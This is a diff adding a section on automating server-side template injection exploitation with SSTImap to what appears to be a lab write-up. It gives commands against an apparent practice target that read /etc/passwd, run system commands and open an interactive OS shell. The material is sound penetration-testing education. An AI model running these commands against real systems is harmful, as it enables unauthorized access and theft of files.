@@ -540,3 +540,53 @@ In this case, the command is executed on the server, and its output is rendered 
 ---
 
 ### Automating SSTI Discovery and Exploitation
+
+When manual testing becomes time-consuming or when dealing with complex applications, automated tools can assist with identifying and exploiting SSTI vulnerabilities. One such tool is `SSTImap`, which supports fingerprinting multiple template engines and automating common exploitation techniques.
+
+Clone the repository and install the required dependencies:
+
+```bash
+git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+pip3 install -r requirements.txt
+```
+
+The following example demonstrates `SSTImap` analyzing a GET parameter to identify the template engine and detect potential SSTI vulnerabilities:
+
+```bash
+python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test
+```
+
+![Filtered output](images/twig4.png)
+
+In this case, `SSTImap` successfully identifies the template engine as `Twig` and reports several exploitable primitives, including `file read` and `file write` capabilities.
+
+The `-D` flag allows `SSTImap` to read files from the target system and download them locally:
+
+```bash
+python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test -D '/etc/passwd' './passwd'
+```
+
+This confirms local file disclosure through the SSTI vulnerability.
+
+The `-S` flag can be used to execute arbitrary system commands on the target:
+
+```bash
+python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test -S id
+```
+
+![Filtered output](images/twig5.png)
+
+This demonstrates remote code execution (RCE) via the SSTI vulnerability.
+
+For deeper post-exploitation, `STImap` supports spawning an interactive shell using the `--os-shell` flag:
+
+```bash
+python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test --os-shell
+```
+
+![Filtered output](images/twig6.png)
+
+This allows direct interaction with the underlying operating system, confirming full compromise of the template rendering context.
+
+---
